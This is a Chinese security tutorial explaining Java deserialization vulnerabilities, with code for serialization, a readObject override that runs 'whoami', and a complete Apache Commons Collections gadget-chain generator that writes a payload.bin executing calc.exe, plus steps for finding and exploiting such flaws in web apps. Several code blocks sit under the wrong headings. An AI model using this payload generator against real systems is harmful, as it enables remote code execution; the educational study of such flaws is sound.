> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzU2NzkxMDUyNg==&mid=2247486261&idx=1&sn=5bce20d898eba670b4b129a8a3092449&chksm=fc974224cbe0cb32c0a7f50dae3f7c19648fb3279d57b9ec69746fb8f80f6303716c0afe7b12&mpshare=1&scene=1&srcid=&sharer_sharetime=1589171497234&sharer_shareid=c051b65ce1b8b68c6869c6345bc45da1&key=a6ffb11f7ca3da63362b0447adb070c9afefc61fb3ca648ed13a521f46353cd495c60121b3227e220c2d50b4ebdbeefe3ce1d29ff848fe71f025ff91f1905c58260ca986c0b4ad23971361e6e1f1e087&ascene=1&uin=ODk4MDE0MDEy&devicetype=Windows+10+x64&version=62090070&lang=zh_CN&exportkey=AbyxoZxn2XqJtwnb0WEuhNA%3D&pass_ticket=k%2FvF2YV12VEoO%2BAnBwfiLLMfsQOdS5f9wjID61CypUOdfzqm8f0N7ueNnKUE9C7n)

**目录**  

反序列化漏洞

序列化和反序列化

    JAVA WEB 中的序列化和反序列化

        对象序列化和反序列范例

    JAVA 中执行系统命令

        重写 readObject() 方法

    Apache Commons Collections

反序列化漏洞 payload

JAVA Web 反序列化漏洞的挖掘和利用 

  

  

  

  

  

  

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fkFTpkFY7gmpvKmZia33W1fWzbECPA9m37yAOiaVwo994T2ia7wEg5UBLKyZRoAc2BVvbfZYH7wh71A/640?wx_fmt=png)

    由于本人并非 JAVA 程序员，所以对 JAVA 方面的知识不是很懂，仅仅是能看懂而已。本文参照几位大佬的博客进行归纳总结，给大家阐述了 JAVA 反序列化漏洞的原理以及 Payload 的构造，文章末尾会放出参考链接。

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fkFTpkFY7gmpvKmZia33W1fPytl5y8sd18JNKGjorPSjsq9TDiaNQNOv66AvU5gPs9ibsV3W9Tldiaug/640?wx_fmt=png)

Part 1

  

  

  

反序列化漏洞

JAVA 反序列化漏洞到底是如何产生的？

1、由于很多站点或者 RMI 仓库等接口处存在 java 的反序列化功能，于是攻击者可以通过构造特定的恶意对象序列化后的流，让目标反序列化，从而达到自己的恶意预期行为，包括命令执行，甚至 getshell 等等。

2、Apache Commons Collections 是开源小组 Apache 研发的一个 Collections 收集器框架。这个框架中有一个 InvokerTransformer.java 接口，实现该接口的类可以通过调用 java 的反射机制来调用任意函数，于是我们可以通过调用 Runtime.getRuntime.exec() 函数来执行系统命令。Apache commons collections 包的广泛使用，也导致了 java 反序列化漏洞的大面积流行。

所以最终结果就是如果 Java 应用对用户的输入做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化过程执行我们自定义的命令，从而实现远程任意代码执行。

在说反序列化漏洞原理之前我们先来说说 JAVA 对象的序列化和反序列化

Part 2

  

  

  

序列化和反序列化

**序列化** (Serialization)：将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。

**反序列化**：从存储区中读取该数据，并将其还原为对象的过程，称为反序列化。

简单的说，序列化和反序列化就是：

*   把对象转换为字节序列的过程称为对象的序列化
    
*   把字节序列恢复为对象的过程称为对象的反序列化
    

对象序列化的用途：

*   把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中
    
*   在网络上传送对象的字节序列
    

当两个进程在进行远程通信时，彼此可以发送各种类型的数据。无论是何种类型的数据，最终都会以二进制的形式在网络上传送。发送方需要把这个 Java 对象序列化；接收方收到数据后把数据反序列化为 Java 对象。

通常，对象实例的所有字段都会被序列化，这意味着数据会被表示为实例的序列化数据。这样，能够解释该格式的代码就能够确定这些数据的值，而不依赖于该成员的可访问性。类似地，反序列化从序列化的表示形式中提取数据，并直接设置对象状态。

对于任何可能包含重要的安全性数据的对象，如果可能，应该使该对象不可序列化。如果它必须为可序列化的，请尝试生成特定字段来保存重要数据。如果无法实现这一点，则应注意该数据会被公开给任何拥有序列化权限的代码，并确保不让任何恶意代码获得该权限。

在很多应用中，需要对某些对象进行序列化，让它们离开内存空间，入住物理硬盘，以便长期保存。比如最常见的是 Web 服务器中的 Session 对象，当有 10 万用户并发访问，就有可能出现 10 万个 Session 对象，内存可能吃不消，于是 Web 容器就会把一些 seesion 先序列化到硬盘中，等要用了，再把保存在硬盘中的对象还原到内存中。

  

  

JAVA WEB 中的序列化和反序列化

*   java.io.ObjectOutputStream 代表对象输出流，它的 **writeObject()** 方法可对参数指定的对象进行序列化，把得到的字节序列写到一个目标输出流中
    
*   java.io.ObjectInputStream 代表对象输入流，它的 **readObject()** 方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回
    

只有实现了 **Serializable** 和 **Externalizable** 接口的类的对象才能被序列化和反序列化。Externalizable 接口继承自 Serializable 接口，实现 Externalizable 接口的类完全由自身来控制反序列化的行为，而实现 Serializable 接口的类既可以采用默认的反序列化方式，也可以自定义反序列化方式。  

**对象序列化包括如下步骤：**

1.  创建一个对象输出流，它可以包装一个其他类型的目标输出流，如文件输出流
    
2.  通过对象输出流的 writeObject() 方法将对象进行序列化
    

**对象反序列化的步骤如下：**

1.  创建一个对象输入流，它可以包装一个其他类型的源输入流，如文件输入流
    
2.  通过对象输入流的 readObject() 方法将字节序列反序列化为对象
    

### 对象序列化和反序列范例

定义一个 User 类，实现 Serializable 接口

```
import java.io.IOException;
import java.io.Serializable;
public class User implements Serializable{
  private String name;
  public String getName(){
    return name;
  }
  public void setName(String name){
    this.name=name;
  }
}
```

```
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
public class Test {
  public static void main(String[] args) throws IOException {
    Test a=new Test();
    try {
      a.run();    //序列化
      a.run2();   //反序列化
    } catch (IOException | ClassNotFoundException e) {
      e.printStackTrace();
    }
  }
  //将该对象进行序列化，存储在本地的test.txt文件中
  public static void run() throws IOException{
    FileOutputStream out=new FileOutputStream("test.txt");   //实例化一个文件输出流
    ObjectOutputStream obj_out=new ObjectOutputStream(out);  //实例化一个对象输出流
    User u=new User();
    u.setName("谢公子");
    obj_out.writeObject(u);   //利用writeObject()方法将类序列化存储在本地
    obj_out.close();
    System.out.println("User对象序列化成功！");
    System.out.println("***********************");
  }
  //将存储在本地test.txt的序列化数据进行反序列化
  public void run2() throws IOException,ClassNotFoundException{
    FileInputStream in = new FileInputStream("test.txt");   //实例化一个文件输入流
    ObjectInputStream ins = new ObjectInputStream(in);      //实例化一个对象输入流
    User u=(User)ins.readObject();
    System.out.println("User对象反序列化成功！");
    System.out.println(u.getName());
                ins.close();           
  }
}
```

定义主类，对 User 对象进行序列化和反序列化

```
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import org.omg.CORBA.portable.InputStream;
 
public class main {
  public static void main(String[] args) throws IOException, InterruptedException {
    Process p=Runtime.getRuntime().exec("whoami");
    java.io.InputStream is=p.getInputStream();
    BufferedReader reader = new BufferedReader(new InputStreamReader(is));
    p.waitFor();
    if (p.exitValue() != 0) {
        //说明命令执行失败，可以进入到错误处理步骤中
    }
    String s = null;
    while ((s = reader.readLine()) != null) {
        System.out.println(s);
    }
  }
}
```

**运行结果**

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fkFTpkFY7gmpvKmZia33W1fovhcX5bibe6DgibyNYcDAO2KVDJEu9vm3GVGuol4q2jeiaFeApaIxn5JQ/640?wx_fmt=png)

同时，会在当前文件夹生成一个 test.txt 用来存储序列化的对象，内容如下：

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fkFTpkFY7gmpvKmZia33W1fviaGPpWKkKmV1NCM9mWnJFbiaNvktZyvwmUV0GTNlvMQnn8fJ5QqU5Jg/640?wx_fmt=png)

  

  

JAVA 中执行系统命令

我们先来看看 JAVA 中执行系统命令的方法，如下代码可以执行系统命令：**whoami**

```
import java.io.BufferedReader;
import java.io.Externalizable;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInput;
import java.io.ObjectOutput;
import java.io.Serializable;
public class User implements Serializable{
  private String name;
  public String getName(){
    return name;
  }
  public void setName(String name){
    this.name=name;
  }
  private void readObject(java.io.ObjectInputStream in)throws ClassNotFoundException,IOException, InterruptedException{
    //这里使用默认的ReadObject方法
    in.defaultReadObject();
    //重写，执行系统命令：whoami
    Process p=Runtime.getRuntime().exec("whoami");
    java.io.InputStream is=p.getInputStream();
    BufferedReader reader = new BufferedReader(new InputStreamReader(is));
    p.waitFor();
    if (p.exitValue() != 0) {
        //说明命令执行失败
        //可以进入到错误处理步骤中
    }
    String s = null;
    while ((s = reader.readLine()) != null) {
        System.out.println(s);
    }
  }
}
```

运行结果 

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fkFTpkFY7gmpvKmZia33W1fmPNWGnyj9KvlTRoog372Wrr179rBJp2LDKnflaFgn7NAIMOQ9UqRfA/640?wx_fmt=png)

重写 readObject() 方法

我们上面说到了可以通过重写 readObject() 方法来自定义类的反序列化方式。所以，我们将 User 类的 readObject() 进行重写

```
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}
```

主类中的代码不变，我们再来执行序列化和反序列化过程。可以看到，除了执行了对象的序列化和反序列化之外，还执行了我们自定义的系统命令的代码。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fkFTpkFY7gmpvKmZia33W1fkANpxbNiakl7Jibpiceej07xQvialycHlXdugIzyICmGiaGV3Qz3ia3jZmQg/640?wx_fmt=png)

  

  

Apache Commons Collections

Apache Commons Collections 是一个扩展了 Java 标准库里的 Collection 结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为 Apache 开源项目的重要组件，Commons Collections 被广泛应用于各种 Java 应用的开发。

Commons Collections 实现了一个 TransformedMap 类，该类是对 Java 标准数据结构 Map 接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由 Transformer 类定义，Transformer 在 TransformedMap 实例化时作为参数传入。

我们可以通过 TransformedMap.decorate() 方法，获得一个 TransformedMap 的实例。如下代码是 TransformedMap.decorate() 方法

```
public interface Transformer {
    public Object transform(Object input);
}
```

`Transformer`是一个接口，其中定义的`transform()`函数用来将一个对象转换成另一个对象。如下所示 

```
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;
 
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
 
public class main2 {
        public static void main(String[] args) throws Exception{
                Transformer[] transformers = new Transformer[] {
                                new ConstantTransformer(Runtime.class),
                                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})};
 
                Transformer transformedChain = new ChainedTransformer(transformers);  //实例化一个反射链
 
                Map innerMap = new HashMap();   //实例化一个Map对象
                innerMap.put("value", "value");
                
                Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain); //将Map对象和反射链作为参数传入
 
                Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  //得到 AnnotationInvocationHandler类的字节码文件
                Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
                ctor.setAccessible(true);
                Object instance = ctor.newInstance(Target.class, outerMap);  //得到我们构造好的 AnnotationInvocationHandler类实例
 
                FileOutputStream f = new FileOutputStream("payload.bin");
                ObjectOutputStream out = new ObjectOutputStream(f);  //创建一个对象输出流
                out.writeObject(instance);  //将我们构造的 AnnotationInvocationHandler类进行序列化
                out.flush();
                out.close();
        }
}
```

当 TransformedMap 中的任意项的 Key 或者 Value 被修改，相应的`Transformer的transform()方法`就会被调用。除此以外，多个`Transformer`还能串起来，形成`ChainedTransformer`。 

Apache Commons Collections 中已经实现了一些常见的 `Transformer`，其中的 `InvokerTransformer` 接口实现了反射链，可以通过 Java 的反射机制来执行任意命令。于是我们可以通过 InvokerTransformer 的反射链获得 Runtime 类来执行系统命令 

传送门——> InvokerTransformer 反射链

在上面的 InvokerTransformer 反射链 这篇文章中我已经介绍了如何通过修改 Value 值来触发执行反射链来执行任意命令。

但是目前的构造还需要依赖于修改`Map`中的 Value 值去触发调用反射链，我们需要想办法通过`readObject()`直接触发。

如果某个可序列化的类重写了 readObject() 方法，并且在 readObject() 中对 Map 类型的变量进行了键值修改操作，并且这个 Map 参数是可控的，就可以实现我们的攻击目标了。

于是，我们找到了这个类：**AnnotationInvocationHandler** ，这个类有一个成员变量 `memberValues` 是`Map<String,Object>`类型，并且在重写的 readObject() 方法中有 memberValue.setValue() 修改 Value 的操作。简直是完美！

于是我们可以实例化一个 AnnotationInvocationHandler 类，将其成员变量 memberValues 赋值为精心构造的恶意 TransformedMap 对象。然后将其序列化，提交给未做安全检查的 Java 应用。Java 应用在进行反序列化操作时，执行了 readObject() 函数，修改了 Map 的 Value，则会触发 TransformedMap 的变换函数 transform()，再通过反射链调用了 Runtime.getRuntime.exec("XXX") 命令，最终就可以执行我们的任意代码了，一切是那么的天衣无缝！

Part 3

  

  

  

反序列化漏洞 payload

*   反序列化时会执行对象的 readObject() 方法
    
*   Runtime.getRuntime.exec(“xx”) 可以执行系统命令
    
*   InvokerTransformer 的 transform() 方法可以通过反射链调用 Runtime.getRuntime.exec(“xx”) 函数来执行系统命令
    
*   TransformedMap 类的 decorate 方法用来实例化一个 TransformedMap 对象，即 public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) ，第二个和第三个参数传入一个 Transformer，当 key 值和 Value 值改变时，会调用 Transformer 的 transformer() 方法。于是我们可以将第三个参数传入 InvokerTransformer
    

**Payload 构造思路：**我们构造恶意的类：AnnotationInvocationHandler，将该类的成员变量 memberValues 赋值为我们精心构造的 TransformedMap 对象，并将 AnnotationInvocationHandler 类进行序列化，然后交给 JAVA WEB 应用进行反序列化。再进行反序列化时，会执行 readObject() 方法，该方法会对成员变量 TransformedMap 的 Value 值进行修改，该修改触发了 TransformedMap 实例化时传入的参数 InvokerTransformer 的 transform() 方法，InvokerTransformer.transform() 方法通过反射链调用 Runtime.getRuntime.exec(“xx”) 函数来执行系统命令

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fkFTpkFY7gmpvKmZia33W1fyBSJQlTa3OoU3O6b03VzSRSicyMnDWOM7iaib9FicRQ857JGtX6Fal6RrA/640?wx_fmt=jpeg)

如下代码，我们通过构造恶意的类 AnnotationInvocationHandler 并将其序列化保存在 payload.bin 文件中，只要将它给存在反序列化漏洞的 JAVA WEB 应用进行反序列化就能执行我们的命令了。

```
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
public class main2 {
        public static void main(String[] args) throws Exception{
                Transformer[] transformers = new Transformer[] {
                                new ConstantTransformer(Runtime.class),
                                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})};
                Transformer transformedChain = new ChainedTransformer(transformers);  //实例化一个反射链
                Map innerMap = new HashMap();   //实例化一个Map对象
                innerMap.put("value", "value");
                Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain); //将Map对象和反射链作为参数传入
                Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  //得到 AnnotationInvocationHandler类的字节码文件
                Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
                ctor.setAccessible(true);
                Object instance = ctor.newInstance(Target.class, outerMap);  //得到我们构造好的 AnnotationInvocationHandler类实例
                FileOutputStream f = new FileOutputStream("payload.bin");
                ObjectOutputStream out = new ObjectOutputStream(f);  //创建一个对象输出流
                out.writeObject(instance);  //将我们构造的 AnnotationInvocationHandler类进行序列化
                out.flush();
                out.close();
        }
}
```

Part 4

  

  

  

JAVA Web 反序列化漏洞的挖掘和利用

**1：漏洞触发场景**  

在 java 编写的 web 应用与 web 服务器间通常会发送大量的序列化对象例如以下场景：　　

*   HTTP 请求中的参数，cookies 以及 Parameters。　　
    
*   RMI 协议，被广泛使用的 RMI 协议完全基于序列化 　　
    
*   JMX 同样用于处理序列化对象 　　
    
*   自定义协议 用来接收与发送原始的 java 对象
    

**2：漏洞挖掘**

(1) 确定反序列化输入点 　

首先应找出 readObject 方法调用，在找到之后进行下一步的注入操作。一般可以通过以下方法进行查找：

    1) 源码审计：寻找可以利用的 “靶点”，即确定调用反序列化函数 readObject 的调用地点。　　

    2) 对该应用进行网络行为抓包，寻找序列化数据，java 序列化的数据一般会以标记（ac ed 00 05）开头，base64 编码后的特征为 rO0AB。　　

(2) 再考察应用的 Class Path 中是否包含 Apache Commons Collections 库 　　

(3) 生成反序列化的 payload 　　

(4) 提交我们的 payload 数据

参考文章：Java 反序列化漏洞从无到有

                  Lib 之过？Java 反序列化漏洞通用利用分析

                 Java 反序列化漏洞分析

                 Commons Collections Java 反序列化漏洞深入分析